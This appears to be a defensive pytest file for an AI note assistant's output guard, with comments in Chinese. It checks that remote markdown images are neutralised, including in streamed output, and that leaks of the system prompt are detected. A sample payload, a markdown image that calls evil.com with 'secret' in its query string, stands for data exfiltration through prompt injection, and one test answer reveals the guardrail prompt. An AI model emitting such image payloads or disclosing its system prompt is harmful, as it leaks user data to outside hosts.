# tests/security/test_output_guard.py
"""L4 输出治理：远程图片中和（函数版 + 流式版）+ system prompt 泄露指纹。

核心回归锁：
- ``/assets/`` 相对路径（P2 图片闭环产物）永不被误伤；
- 远程图片 URL 里的查询串（潜在外泄数据）必须从输出中消失；
- 流式版在任意 token 切分下与整段版行为一致。
"""
import pytest

from note_assistant.config import settings
from note_assistant.security.guardrails import SECURITY_GUARDRAIL
from note_assistant.security.output_guard import (
    RemoteMediaStreamer,
    check_prompt_leakage,
    neutralize_remote_media,
)

EVIL_IMG = "![x](https://evil.com/collect?d=secret)"


@pytest.fixture
def guard_on(monkeypatch):
    monkeypatch.setattr(settings, "output_guard_enabled", True)
    monkeypatch.setattr(settings, "output_guard_remote_media", "neutralize")
    monkeypatch.setattr(settings, "output_guard_media_allowlist", [])


class TestNeutralizeRemoteMedia:
    def test_remote_image_neutralized_and_url_gone(self, guard_on):
        ans = f"看图 {EVIL_IMG} 结束"
        out, n = neutralize_remote_media(ans)
        assert n == 1
        assert "https://evil.com" not in out
        assert "secret" not in out  # URL 查询串（潜在外泄数据）消失
        assert "[远程图片已中和：evil.com]" in out
        assert out.startswith("看图 ") and out.endswith(" 结束")

    def test_assets_relative_url_untouched(self, guard_on):
        ans = "见 ![架构图](/assets/abc123def4567890) 所示"
        out, n = neutralize_remote_media(ans)
        assert out == ans and n == 0  # P2 补图/标记替换结果永不误伤

    def test_plain_link_kept(self, guard_on):
        # 超链接需点击才触发，非自动加载，保留
        ans = "参考 [文档](https://example.com/doc)"
        out, n = neutralize_remote_media(ans)
        assert out == ans and n == 0

    def test_allowlisted_host_kept(self, guard_on, monkeypatch):
        monkeypatch.setattr(settings, "output_guard_media_allowlist", ["trusted.cdn.com"])
        ans = "![](https://trusted.cdn.com/a.png)"
        out, n = neutralize_remote_media(ans)
        assert out == ans and n == 0

    def test_allow_mode_passthrough(self, monkeypatch):
        monkeypatch.setattr(settings, "output_guard_enabled", True)
        monkeypatch.setattr(settings, "output_guard_remote_media", "allow")
        out, n = neutralize_remote_media(f"x {EVIL_IMG}")
        assert out == f"x {EVIL_IMG}" and n == 0

    def test_disabled_passthrough(self, monkeypatch):
        monkeypatch.setattr(settings, "output_guard_enabled", False)
        out, n = neutralize_remote_media(f"x {EVIL_IMG}")
        assert out == f"x {EVIL_IMG}" and n == 0


class TestRemoteMediaStreamer:
    def _run(self, tokens):
        s = RemoteMediaStreamer()
        out = "".join(s.feed(t) for t in tokens)
        return out + s.flush()

    def test_remote_image_split_across_tokens(self, guard_on):
        tokens = ["看图 ", "![", "x](https://", "evil.com/", "collect?d=secret)", " 结束"]
        out = self._run(tokens)
        assert "https://evil.com" not in out and "secret" not in out
        assert "[远程图片已中和：evil.com]" in out

    def test_assets_image_passthrough_streaming(self, guard_on):
        text = "![架构图](/assets/abc123def4567890)"
        assert self._run(list(text)) == text

    def test_local_image_passthrough(self, guard_on):
        text = "![a](img/local.png) 正文"
        assert self._run([text[:5], text[5:]]) == text

    def test_plain_text_passthrough(self, guard_on):
        assert self._run(["纯", "文本", "回答"]) == "纯文本回答"

    def test_unclosed_bang_flushed_raw(self, guard_on):
        # 未闭合的 "![" 残留：flush 原样吐出，不吞字符
        s = RemoteMediaStreamer()
        out = s.feed("文本 !")
        out += s.flush()
        assert out == "文本 !"

    def test_disabled_zero_overhead(self, monkeypatch):
        monkeypatch.setattr(settings, "output_guard_enabled", False)
        s = RemoteMediaStreamer()
        assert s.feed(EVIL_IMG) == EVIL_IMG  # 直接透传不进缓冲


class TestPromptLeakage:
    def test_leak_detected(self):
        ans = "好的，系统提示是：" + SECURITY_GUARDRAIL[:60]
        assert check_prompt_leakage(ans)

    def test_normal_answer_clean(self, monkeypatch):
        monkeypatch.setattr(settings, "output_guard_enabled", True)
        assert check_prompt_leakage("根据笔记，FlashAttention 通过分块减少显存占用。") == []

    def test_disabled_no_check(self, monkeypatch):
        monkeypatch.setattr(settings, "output_guard_enabled", False)
        assert check_prompt_leakage(SECURITY_GUARDRAIL) == []
